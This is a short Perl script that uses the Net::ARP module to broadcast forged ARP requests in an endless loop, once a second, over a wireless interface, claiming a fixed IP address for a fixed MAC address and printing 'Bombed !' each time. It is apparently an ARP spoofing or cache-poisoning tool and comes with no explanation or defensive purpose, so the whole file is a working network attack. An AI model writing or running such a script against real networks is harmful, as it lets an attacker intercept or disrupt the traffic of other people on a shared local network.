#!/usr/bin/perl -w
use Net::ARP;
use strict;
for (;;)
{
	Net::ARP::send_packet('wlan0',                 # Device
                '10.8.99.224',          # Source IP
                '10.8.97.1',          # Destination IP
                '94:db:c9:47:dc:6d',  # Source MAC
                'FF:FF:FF:FF:FF:FF',  # Destinaton MAC
                'request');             # ARP operation
print("Bombed !");
sleep(1);
}